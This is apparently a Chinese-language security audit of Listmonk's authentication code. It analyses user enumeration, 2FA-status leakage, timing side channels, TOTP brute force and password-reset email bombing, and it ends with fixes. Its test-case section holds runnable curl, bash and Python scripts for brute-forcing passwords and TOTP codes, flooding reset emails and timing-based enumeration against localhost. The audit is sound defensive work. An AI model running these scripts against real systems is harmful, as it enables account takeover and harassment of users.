# Listmonk 认证路径信息泄露安全分析报告

## 1. 分析范围

| 路径/函数 | 源文件 | 行号 |
|---|---|---|
| `doLogin` | `cmd/auth.go` | L450-L500 |
| `doForgotPassword` | `cmd/auth.go` | L581-L645 |
| `doResetPassword` | `cmd/auth.go` | L648-L702 |
| `doTwofaVerify` | `cmd/auth.go` | L717-L752 |
| `OIDCFinish` | `cmd/auth.go` | L204-L272 |
| `tmptokens.Check` | `internal/tmptokens/tmptokens.go` | L62-L90 |
| `tmptokens.Get` | `internal/tmptokens/tmptokens.go` | L94-L113 |
| `core.LoginUser` | `internal/core/users.go` | L160-L172 |

路由注册（`cmd/handlers.go` L244-L257）：

```
POST /admin/login          → a.LoginPage → doLogin
GET  /admin/login/twofa    → a.TwofaPage
POST /admin/login/twofa    → a.TwofaPage → doTwofaVerify
GET  /admin/forgot         → a.ForgotPage
POST /admin/forgot         → a.ForgotPage → doForgotPassword
GET  /admin/reset          → a.ResetPage
POST /admin/reset          → a.ResetPage → doResetPassword
POST /auth/oidc            → a.OIDCLogin
GET  /auth/oidc            → a.OIDCFinish
```

---

## 2. 各路径逐项分析

### 2.1 `doLogin` — 用户名/密码登录

**源码证据**（`cmd/auth.go` L450-L500）：

```go
func (a *App) doLogin(c echo.Context) error {
    var (
        startTime = time.Now()
        username  = strings.TrimSpace(c.FormValue("username"))
        password  = strings.TrimSpace(c.FormValue("password"))
    )
    // ✅ 时间缓解：保证响应至少 100ms
    defer func() {
        if elapsed := time.Since(startTime).Milliseconds(); elapsed < 100 {
            time.Sleep(time.Duration(100-elapsed) * time.Millisecond)
        }
    }()
    // ...
    user, err := a.core.LoginUser(username, password)
    if err != nil {
        return err  // 返回 LoginUser 的错误
    }
    // ⚠️ 关键泄露点：如果用户启用了 2FA，重定向到 2FA 页面
    if user.TwofaType == models.TwofaTypeTOTP {
        token, _ := generateRandomString(tmpAuthTokenLen)
        tmptokens.Set(token, twofaTokenTTL, user.ID)
        return c.Redirect(http.StatusFound,
            fmt.Sprintf("%s/login/twofa?token=%s&next=%s", uriAdmin, token, url.QueryEscape(next)))
    }
    // ...
}
```

| 维度 | 评估 |
|---|---|
| **信息泄露** | ⚠️ **高** — 成功登录+2FA启用 → 302重定向至2FA页面；成功登录+无2FA → 302重定向至管理页面；失败 → 错误消息。攻击者可由此推断：(1) 账号是否存在（若密码已知可确认），(2) 账号是否启用了2FA |
| **时间限制** | ✅ 有 — 100ms最低响应时间缓解时序攻击 |
| **次数限制** | ❌ 无 — 无登录失败次数限制、无IP速率限制、无账号锁定机制 |
| **邮件依赖** | ❌ 无 |

---

### 2.2 `core.LoginUser` — 核心登录验证

**源码证据**（`internal/core/users.go` L160-L172）：

```go
func (c *Core) LoginUser(username, password string) (auth.User, error) {
    var out auth.User
    if err := c.q.LoginUser.Get(&out, username, password); err != nil {
        if err == sql.ErrNoRows {
            return out, echo.NewHTTPError(http.StatusForbidden, c.i18n.T("users.invalidLogin"))
        }
        return out, echo.NewHTTPError(http.StatusInternalServerError, ...)
    }
    return out, nil
}
```

**SQL查询**（`queries/users.sql` L134-L141）：

```sql
-- name: login-user
WITH u AS (
    SELECT users.*, r.name as role_name, r.permissions FROM users
    LEFT JOIN roles r ON (r.id = users.user_role_id)
    WHERE username = $1 AND status != 'disabled' AND password_login = TRUE
    AND CRYPT($2, password) = password
)
UPDATE users SET loggedin_at = NOW() WHERE id = (SELECT id FROM u) RETURNING *;
```

| 维度 | 评估 |
|---|---|
| **信息泄露** | ✅ **低** — 用户名/密码/状态/密码登录标志合并为单一SQL查询；不存在用户→返回 `sql.ErrNoRows` → 统一为 `403 invalidLogin`；密码错误→同样返回空结果→统一 `403`。攻击者无法从错误消息区分"用户不存在"和"密码错误" |
| **时间限制** | ⚠️ 部分 — `CRYPT($2, password)` 使用 bcrypt，固定耗时约100ms；但用户不存在时跳过bcrypt，响应更快。上层 `doLogin` 的100ms垫片可部分缓解，但精确计时仍可能泄露 |
| **次数限制** | ❌ 无 — 无任何限速 |
| **邮件依赖** | ❌ 无 |

---

### 2.3 `doForgotPassword` — 忘记密码

**源码证据**（`cmd/auth.go` L581-L645）：

```go
func (a *App) doForgotPassword(c echo.Context) error {
    email := strings.ToLower(strings.TrimSpace(c.FormValue("email")))
    if !utils.ValidateEmail(email) {
        // ✅ 返回成功消息（防止枚举）
        return c.Render(http.StatusOK, tplMessage,
            makeMsgTpl(a.i18n.T("users.resetPassword"), "", a.i18n.T("users.resetLinkSent")))
    }
    user, err := a.core.GetUser(0, "", email)
    if err != nil {
        // ✅ 用户不存在也返回相同成功消息
        return c.Render(http.StatusOK, tplMessage,
            makeMsgTpl(a.i18n.T("users.resetPassword"), "", a.i18n.T("users.resetLinkSent")))
    }
    if !user.PasswordLogin {
        // ✅ 密码登录禁用也返回相同成功消息
        return c.Render(http.StatusOK, tplMessage,
            makeMsgTpl(a.i18n.T("users.resetPassword"), "", a.i18n.T("users.resetLinkSent")))
    }
    // ... 生成 token、发送邮件 ...
    // ✅ 最终也返回相同成功消息
    return c.Render(http.StatusOK, tplMessage,
        makeMsgTpl(a.i18n.T("users.resetPassword"), "", a.i18n.T("users.resetLinkSent")))
}
```

| 维度 | 评估 |
|---|---|
| **信息泄露** | ⚠️ **中** — 错误消息统一返回 `resetLinkSent`，防止直接枚举；但存在 **时序侧信道**：用户存在时需执行 GetUser + 生成token + 发送邮件，响应时间明显更长；用户不存在时立即返回 |
| **时间限制** | ❌ 无 — 无时序缓解措施（与 doLogin 的100ms垫片不同，此处无类似机制） |
| **次数限制** | ❌ 无 — 无IP速率限制、无邮箱频率限制。攻击者可无限次触发密码重置邮件 |
| **邮件依赖** | ✅ 是 — 用户存在时通过 `a.emailMsgr.Push()` 发送重置链接邮件。受害者邮箱收到重置邮件本身就是信息泄露的侧信道（攻击者可观察受害者是否收到邮件） |

---

### 2.4 `doResetPassword` — 重置密码

**源码证据**（`cmd/auth.go` L648-L702）：

```go
func (a *App) doResetPassword(c echo.Context, token, email string) error {
    // 验证并消费token（一次性使用）
    data, err := tmptokens.Get(email)
    if err != nil {
        return c.Render(http.StatusBadRequest, tplMessage,
            makeMsgTpl(..., a.i18n.T("users.invalidResetLink")))
    }
    tk, ok := data.(string)
    if !ok || tk != token {
        return c.Render(http.StatusBadRequest, tplMessage,
            makeMsgTpl(..., a.i18n.T("users.invalidResetLink")))
    }
    user, err := a.core.GetUser(0, "", email)
    if err != nil {
        return c.Render(http.StatusBadRequest, tplMessage,
            makeMsgTpl(..., a.i18n.T("users.invalidResetLink")))
    }
    if !user.PasswordLogin {
        return c.Render(http.StatusBadRequest, tplMessage,
            makeMsgTpl(..., a.i18n.T("public.invalidFeature")))
    }
    // ... 更新密码、销毁旧会话、自动登录 ...
}
```

| 维度 | 评估 |
|---|---|
| **信息泄露** | ⚠️ **中** — `PasswordLogin=false` 时返回 `invalidFeature`（与 `invalidResetLink` 不同），泄露该账号的密码登录状态；GET阶段 `ResetPage` 也会区分 `invalidResetLink` 和正常页面 |
| **时间限制** | ❌ 无 |
| **次数限制** | ⚠️ 部分 — `tmptokens.Get` 一次性消费token，但GET阶段的 `tmptokens.Check` 有15次上限 |
| **邮件依赖** | ❌ 否（但获取token本身依赖邮件通知） |

---

### 2.5 `doTwofaVerify` — 2FA验证

**源码证据**（`cmd/auth.go` L717-L752）：

```go
func (a *App) doTwofaVerify(c echo.Context, token string, userID int, next string) error {
    totpCode := strings.TrimSpace(c.FormValue("totp_code"))
    if !strHasLen(totpCode, 6, 6) {
        return a.renderTwofaPage(c, token, next, a.i18n.T("globals.messages.invalidValue"))
    }
    user, err := a.core.GetUser(userID, "", "")
    if err != nil {
        return a.renderTwofaPage(c, token, next, a.i18n.T("users.invalidRequest"))
    }
    if user.TwofaType != models.TwofaTypeTOTP {
        return a.renderTwofaPage(c, token, next, a.i18n.T("users.twoFANotEnabled"))
    }
    valid := totp.Validate(totpCode, user.TwofaKey.String)
    if !valid {
        return a.renderTwofaPage(c, token, next, a.i18n.T("globals.messages.invalidValue"))
    }
    tmptokens.Delete(token)
    // ... 创建会话 ...
}
```

**前置门控**（`TwofaPage`，`cmd/auth.go` L127-L165）：

```go
func (a *App) TwofaPage(c echo.Context) error {
    token = strings.TrimSpace(c.QueryParam("token"))
    if len(token) < tmpAuthTokenLen {
        return c.Redirect(http.StatusFound, uriAdmin)  // 无token → 重定向
    }
    data, err := tmptokens.Check(token)  // 验证临时token
    if err != nil {
        return c.Redirect(http.StatusFound, uriAdmin)  // token无效 → 重定向
    }
    userID, ok := data.(int)
    if !ok {
        return a.renderTwofaPage(c, token, next, a.i18n.T("users.invalidRequest"))
    }
    // ...
}
```

| 维度 | 评估 |
|---|---|
| **信息泄露** | ⚠️ **中** — 错误消息 `twoFANotEnabled` 区分了2FA未启用的状态，但到达此路径需要先通过密码验证；`invalidValue` 统一了TOTP错误，不泄露TOTP secret |
| **时间限制** | ❌ 无 |
| **次数限制** | ⚠️ 部分 — `tmptokens.Check` 在 `TwofaPage` 入口处限制15次验证（`maxTries=15`），超限后token自动删除；但 **攻击者可反复登录获取新token**，实现无限2FA暴力破解 |
| **邮件依赖** | ❌ 无 |

---

### 2.6 `OIDCFinish` — OIDC回调完成

**源码证据**（`cmd/auth.go` L204-L272）：

```go
func (a *App) OIDCFinish(c echo.Context) error {
    // ... nonce/state 验证 ...
    email := strings.ToLower(em.Address)
    claims.Email = email

    user, userErr := a.core.GetUser(0, "", email)
    if userErr != nil {
        if httpErr, ok := userErr.(*echo.HTTPError);
            ok && httpErr.Code == http.StatusNotFound && a.cfg.Security.OIDC.AutoCreateUsers {
            u, err := a.createOIDCUser(claims, c)
            // ...
        } else {
            // ⚠️ 直接返回 userErr（可能是 404 notFound）
            return a.renderLoginPage(c, userErr)
        }
    }
    // ...
}
```

| 维度 | 评估 |
|---|---|
| **信息泄露** | 🔴 **高** — 当 `AutoCreateUsers=false` 时，如果OIDC提供的email在系统中不存在，`GetUser` 返回的 `404 notFound` 错误被直接透传到登录页面。攻击者可通过OIDC认证流程确认某邮箱是否在系统中注册 |
| **时间限制** | ❌ 无 |
| **次数限制** | ❌ 无 — 无OIDC回调频率限制 |
| **邮件依赖** | ❌ 无 |

---

### 2.7 `tmptokens.Check` / `tmptokens.Get` — 临时令牌管理

**源码证据**（`internal/tmptokens/tmptokens.go`）：

```go
const maxTries = 15

func Check(id string) (any, error) {
    token, exists := tokens[id]
    if !exists { return nil, Err }
    if time.Since(token.CreatedAt) > token.TTL {
        delete(tokens, id)
        return nil, Err
    }
    token.Count++
    if token.Count > maxTries {
        delete(tokens, id)  // 超限后自动删除
        return nil, Err
    }
    tokens[id] = token
    return token.Data, nil
}

func Get(id string) (any, error) {
    token, exists := tokens[id]
    if !exists { return nil, Err }
    if time.Since(token.CreatedAt) > token.TTL {
        delete(tokens, id)
        return nil, Err
    }
    delete(tokens, id)  // 一次性消费
    return token.Data, nil
}
```

| 维度 | 评估 |
|---|---|
| **信息泄露** | ✅ 低 — 仅返回存储的数据或统一错误 `Err` |
| **时间限制** | ⚠️ 部分 — `passwordResetTTL=30min`，`twofaTokenTTL=5min` |
| **次数限制** | ⚠️ 部分 — `Check` 有15次上限（用于2FA入口和ResetPage GET阶段）；`Get` 为一次性消费（用于doResetPassword POST阶段）。但token删除后攻击者可重新触发流程获取新token |
| **邮件依赖** | ❌ 无（但获取密码重置token依赖邮件） |

---

## 3. 综合分析矩阵

| 路径 | 信息泄露风险 | 时间缓解 | 次数限制 | 邮件依赖 |
|---|---|---|---|---|
| `doLogin` | ⚠️ 高（2FA重定向泄露） | ✅ 100ms垫片 | ❌ 无 | ❌ |
| `core.LoginUser` | ✅ 低（统一403） | ⚠️ bcrypt差异 | ❌ 无 | ❌ |
| `doForgotPassword` | ⚠️ 中（时序侧信道） | ❌ 无 | ❌ 无 | ✅ 发送邮件 |
| `doResetPassword` | ⚠️ 中（错误消息差异） | ❌ 无 | ⚠️ 一次性token | ❌ |
| `doTwofaVerify` | ⚠️ 中（twoFANotEnabled） | ❌ 无 | ⚠️ 15次/token | ❌ |
| `OIDCFinish` | 🔴 高（404透传） | ❌ 无 | ❌ 无 | ❌ |
| `tmptokens.Check` | ✅ 低 | — | ✅ 15次 | ❌ |
| `tmptokens.Get` | ✅ 低 | — | ✅ 一次性 | ❌ |

---

## 4. 攻击序列

### 攻击序列 A：OIDC回调用户枚举（最高优先级）

**前提条件**：OIDC已启用，`AutoCreateUsers=false`

```
步骤1: 攻击者获取目标邮箱 victim@example.com
步骤2: 访问 /admin/login 获取 nonce cookie
步骤3: 发起 OIDC 认证 → POST /auth/oidc (携带 nonce)
步骤4: 使用目标邮箱在 OIDC 提供商完成认证
步骤5: 回调 GET /auth/oidc?code=xxx&state=yyy
步骤6: 观察响应：
   - 若显示 "user not found" 错误 → 邮箱未注册
   - 若登录成功 → 邮箱已注册
```

**泄露根因**：[OIDCFinish](cmd/auth.go#L244-L258) 在 `GetUser` 返回404时，直接将 `userErr` 透传给 `renderLoginPage`，未做统一错误消息处理。

**证据**：

```go
// cmd/auth.go L244-L257
user, userErr := a.core.GetUser(0, "", email)
if userErr != nil {
    if httpErr, ok := userErr.(*echo.HTTPError);
        ok && httpErr.Code == http.StatusNotFound && a.cfg.Security.OIDC.AutoCreateUsers {
        // 自动创建...
    } else {
        return a.renderLoginPage(c, userErr)  // ← 直接透传 404 错误
    }
}
```

---

### 攻击序列 B：登录+2FA状态枚举

**前提条件**：攻击者知道或猜测用户密码

```
步骤1: POST /admin/login  username=victim&password=guess
步骤2: 观察响应：
   - 403 "invalidLogin" → 用户名不存在或密码错误
   - 302 → /admin/ (无2FA) → 账号存在且无2FA
   - 302 → /admin/login/twofa?token=xxx → 账号存在且启用了2FA
```

**泄露根因**：[doLogin](cmd/auth.go#L478-L491) 在密码正确后根据 `user.TwofaType` 决定重定向目标，直接泄露2FA启用状态。

**证据**：

```go
// cmd/auth.go L478-L491
if user.TwofaType == models.TwofaTypeTOTP {
    token, _ := generateRandomString(tmpAuthTokenLen)
    tmptokens.Set(token, twofaTokenTTL, user.ID)
    return c.Redirect(http.StatusFound,
        fmt.Sprintf("%s/login/twofa?token=%s&next=%s", uriAdmin, token, url.QueryEscape(next)))
}
```

---

### 攻击序列 C：忘记密码时序侧信道

**前提条件**：无

```
步骤1: 对已知邮箱集合，POST /admin/forgot email=xxx
步骤2: 精确测量响应时间（多次取平均）
步骤3: 响应时间较长的 → 邮箱已注册（经历了 GetUser + token生成 + 邮件发送）
步骤4: 响应时间较短的 → 邮箱未注册（立即返回成功消息）
```

**泄露根因**：[doForgotPassword](cmd/auth.go#L581-L645) 虽然统一了响应消息，但未做时序缓解。用户存在时需要额外执行 token 生成和邮件推送。

**证据**：

```go
// cmd/auth.go L592-L644 — 用户存在路径明显更长
user, err := a.core.GetUser(0, "", email)  // DB查询
// ... token 生成 ...
tmptokens.Set(email, passwordResetTTL, token)  // 内存写入
// ... 模板渲染 ...
a.emailMsgr.Push(models.Message{...})  // 邮件发送 ← 最耗时操作
```

---

### 攻击序列 D：2FA验证码无限暴力破解

**前提条件**：攻击者已知用户密码

```
步骤1: POST /admin/login  username=victim&password=known  → 获得twofa token
步骤2: POST /admin/login/twofa  token=xxx&totp_code=000000
步骤3: 重复步骤2，尝试不同TOTP码（最多15次后token失效）
步骤4: token失效后，回到步骤1重新登录获取新token
步骤5: 无限循环，每次15次尝试，TOTP窗口30秒内有效码约2-3个
```

**泄露根因**：[doTwofaVerify](cmd/auth.go#L717-L752) 的 `tmptokens.Check` 限制单token 15次，但登录接口无频率限制，攻击者可无限重新登录获取新2FA token。

---

### 攻击序列 E：重置密码错误消息差异

**前提条件**：攻击者通过钓鱼或其他方式获得了重置链接

```
步骤1: 访问 GET /admin/reset?token=xxx&email=victim@example.com
步骤2: 提交 POST /admin/reset (token, email, 新密码)
步骤3: 观察响应：
   - "invalidResetLink" → token无效或用户不存在
   - "invalidFeature" → 用户存在但 PasswordLogin=false（OIDC-only用户）
   - 成功重定向 → 用户存在且密码登录已启用
```

**泄露根因**：[doResetPassword](cmd/auth.go#L679-L682) 对 `PasswordLogin=false` 返回了不同的错误消息 `public.invalidFeature`，与 `invalidResetLink` 不同。

**证据**：

```go
// cmd/auth.go L679-L682
if !user.PasswordLogin {
    return c.Render(http.StatusBadRequest, tplMessage,
        makeMsgTpl(a.i18n.T("users.resetPassword"), "", a.i18n.T("public.invalidFeature")))
}
```

---

### 攻击序列 F：忘记密码邮件轰炸

**前提条件**：无

```
步骤1: POST /admin/forgot email=victim@example.com
步骤2: 自动化脚本无限重复步骤1
步骤3: 受害者邮箱被大量重置密码邮件轰炸
```

**泄露根因**：[doForgotPassword](cmd/auth.go#L581-L645) 无任何频率限制，且邮件发送无队列限制。

---

## 5. 剩余风险总结

| 编号 | 风险 | 严重性 | 状态 |
|---|---|---|---|
| R1 | OIDC回调用户枚举（AutoCreateUsers=false时404透传） | 🔴 高 | 未修复 |
| R2 | doLogin 2FA重定向泄露账号状态 | 🔴 高 | 未修复 |
| R3 | doForgotPassword 时序侧信道泄露用户存在性 | ⚠️ 中 | 未修复 |
| R4 | doResetPassword 错误消息差异泄露PasswordLogin状态 | ⚠️ 中 | 未修复 |
| R5 | 2FA验证码无限暴力破解（重新登录获取新token） | ⚠️ 中 | 未修复 |
| R6 | 全部认证端点无IP级速率限制 | ⚠️ 中 | 未修复 |
| R7 | doForgotPassword 邮件轰炸（无频率限制） | ⚠️ 中 | 未修复 |
| R8 | LoginUser bcrypt时序差异（用户存在vs不存在） | 🟡 低 | 部分缓解（100ms垫片） |

---

## 6. 测试用例

### 测试用例 TC-01：OIDC回调用户枚举

```bash
# 前提：OIDC已启用，AutoCreateUsers=false
# 步骤1：获取nonce
curl -c cookies.txt http://localhost:9000/admin/login
NONCE=$(grep nonce cookies.txt | awk '{print $NF}')

# 步骤2：发起OIDC认证
curl -b cookies.txt -c cookies.txt \
  -d "nonce=$NONCE&next=/" \
  http://localhost:9000/auth/oidc -L -v 2>&1 | grep "Location:"

# 步骤3：在OIDC提供商完成认证后，使用已注册邮箱回调
curl -b cookies.txt \
  "http://localhost:9000/auth/oidc?code=VALID_CODE&state=ENCODED_STATE" -v
# 预期：登录成功 → 用户存在

# 步骤4：使用未注册邮箱回调
curl -b cookies.txt \
  "http://localhost:9000/auth/oidc?code=VALID_CODE_2&state=ENCODED_STATE_2" -v
# 预期（有漏洞）：显示 "not found" 错误 → 用户不存在
# 期望安全行为：显示统一的登录失败消息
```

### 测试用例 TC-02：登录2FA状态泄露

```bash
# 测试无2FA用户
curl -X POST http://localhost:9000/admin/login \
  -d "username=user_no_2fa&password=correctpass&next=/" -v 2>&1 | grep "Location:"
# 预期：Location: /admin/

# 测试有2FA用户
curl -X POST http://localhost:9000/admin/login \
  -d "username=user_with_2fa&password=correctpass&next=/" -v 2>&1 | grep "Location:"
# 预期（泄露）：Location: /admin/login/twofa?token=... → 2FA启用状态泄露

# 测试不存在的用户
curl -X POST http://localhost:9000/admin/login \
  -d "username=nonexistent&password=anypass&next=/" -v 2>&1
# 预期：403 invalidLogin（安全）
```

### 测试用例 TC-03：忘记密码时序分析

```python
import requests
import time
import statistics

URL = "http://localhost:9000/admin/forgot"
EXISTING_EMAIL = "admin@example.com"
NONEXISTENT_EMAIL = "nonexistent@example.com"

def measure(email, n=20):
    times = []
    for _ in range(n):
        start = time.perf_counter()
        requests.post(URL, data={"email": email})
        elapsed = time.perf_counter() - start
        times.append(elapsed)
    return statistics.mean(times), statistics.stdev(times)

mean_exist, std_exist = measure(EXISTING_EMAIL)
mean_nonexist, std_nonexist = measure(NONEXISTENT_EMAIL)

print(f"已注册邮箱: {mean_exist:.4f}s ± {std_exist:.4f}s")
print(f"未注册邮箱: {mean_nonexist:.4f}s ± {std_nonexist:.4f}s")
print(f"差异: {abs(mean_exist - mean_nonexist):.4f}s")
# 预期（有漏洞）：已注册邮箱响应时间显著更长（邮件发送开销）
# 期望安全行为：两者响应时间无显著差异
```

### 测试用例 TC-04：重置密码错误消息差异

```bash
# 测试PasswordLogin=false的用户（OIDC-only用户）
curl "http://localhost:9000/admin/reset?token=VALID_TOKEN&email=oidc_user@example.com" \
  -d "password=newpassword123&password2=newpassword123" -v
# 预期（泄露）：返回 "invalidFeature" → 确认用户存在但密码登录禁用

# 测试无效token
curl "http://localhost:9000/admin/reset?token=INVALID&email=any@example.com" \
  -d "password=newpassword123&password2=newpassword123" -v
# 预期：返回 "invalidResetLink"
# 两类错误消息不同 → 信息泄露
```

### 测试用例 TC-05：2FA暴力破解循环

```bash
# 步骤1：登录获取2FA token
RESPONSE=$(curl -X POST http://localhost:9000/admin/login \
  -d "username=user_with_2fa&password=correctpass&next=/" -v 2>&1)
TOKEN=$(echo "$RESPONSE" | grep "Location:" | grep -oP 'token=\K[^&]+')

# 步骤2：尝试15次TOTP码（消耗token）
for i in $(seq -w 000000 000014); do
  curl -X POST "http://localhost:9000/admin/login/twofa" \
    -d "token=$TOKEN&totp_code=$i&next=/"
done

# 步骤3：token耗尽后重新登录获取新token
NEW_RESPONSE=$(curl -X POST http://localhost:9000/admin/login \
  -d "username=user_with_2fa&password=correctpass&next=/" -v 2>&1)
NEW_TOKEN=$(echo "$NEW_RESPONSE" | grep "Location:" | grep -oP 'token=\K[^&]+')

# 步骤4：继续暴力破解（无限循环）
# 预期（漏洞）：每次登录可获得新token，15次/轮 × 无限轮 = 无限暴力破解
```

### 测试用例 TC-06：邮件轰炸

```bash
# 无速率限制的忘记密码请求
for i in $(seq 1 100); do
  curl -X POST http://localhost:9000/admin/forgot \
    -d "email=victim@example.com" &
done
wait
# 预期（漏洞）：受害者收到100封重置密码邮件
# 期望安全行为：同一邮箱有频率限制（如5分钟1次）
```

### 测试用例 TC-07：登录无速率限制

```bash
# 暴力破解密码
for pass in $(cat wordlist.txt); do
  curl -X POST http://localhost:9000/admin/login \
    -d "username=admin&password=$pass&next=/" -s -o /dev/null -w "%{http_code}\n"
done
# 预期（漏洞）：所有请求均被处理，无锁定或限速
# 期望安全行为：连续失败5次后锁定账号或限速IP
```

---

## 7. 修复建议

| 编号 | 风险 | 修复建议 |
|---|---|---|
| R1 | OIDC回调枚举 | `OIDCFinish` 中统一返回登录失败消息，不透传 `GetUser` 的404错误；无论用户是否存在都显示相同的"登录失败"页面 |
| R2 | 2FA重定向泄露 | `doLogin` 中无论是否有2FA，都统一返回"登录成功，请继续"的中间页面，不通过重定向目标区分2FA状态 |
| R3 | 忘记密码时序 | `doForgotPassword` 中添加与 `doLogin` 类似的固定延迟垫片；对不存在的邮箱也执行模拟的token生成和伪邮件发送操作 |
| R4 | 重置密码错误差异 | `doResetPassword` 中将 `invalidFeature` 改为与 `invalidResetLink` 统一的错误消息 |
| R5 | 2FA无限暴力 | 在 `doLogin` 或 `doTwofaVerify` 中添加基于用户ID的失败计数器，连续失败N次后锁定2FA验证一段时间 |
| R6 | 无IP速率限制 | 在所有认证端点添加中间件级别的IP速率限制（如 `golang.org/x/time/rate`） |
| R7 | 邮件轰炸 | 在 `doForgotPassword` 中对同一邮箱添加发送频率限制（如5分钟1次），使用内存或Redis记录最近发送时间 |
| R8 | bcrypt时序差异 | 增大 `doLogin` 的最低延迟垫片至200ms+（覆盖bcrypt的典型耗时范围），或在 `LoginUser` 中对不存在的用户也执行一次虚拟的bcrypt比较 |
